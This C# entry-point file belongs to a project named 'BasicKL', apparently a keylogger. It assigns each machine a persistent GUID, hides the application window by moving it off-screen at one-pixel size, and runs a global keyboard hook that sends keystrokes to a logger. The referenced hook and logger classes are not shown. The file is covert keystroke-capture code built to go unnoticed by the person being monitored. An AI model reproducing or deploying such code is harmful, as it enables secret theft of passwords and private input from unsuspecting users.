using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Configuration;

using log4net;

[assembly: log4net.Config.XmlConfigurator(Watch = true)]

namespace BasicKL
{
    static class Program
    {

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            Guid gid;
            string id = ConfigurationManager.AppSettings["myId"];
            bool validId = Guid.TryParse(id, out gid);

            if (!validId)
            {
                gid = Guid.NewGuid();
                Configuration config = ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None);
                config.AppSettings.Settings["myId"].Value = gid.ToString();
                config.Save();
            }

            Logger log = new Logger(gid);

            Form1 form = new Form1(log);
            form.FormBorderStyle = FormBorderStyle.FixedToolWindow;
            form.StartPosition = FormStartPosition.Manual;
            form.Location = new System.Drawing.Point(-2000, -2000);
            form.Size = new System.Drawing.Size(1, 1);

            

            using (KeyHookManager khm = new KeyHookManager(log.Log))
            {
                //log.Info(Convert.ToString((int)Keys.Control) + " ?=? " + Convert.ToString(0x10));
                Application.Run(form);
            }
        }
    }
}
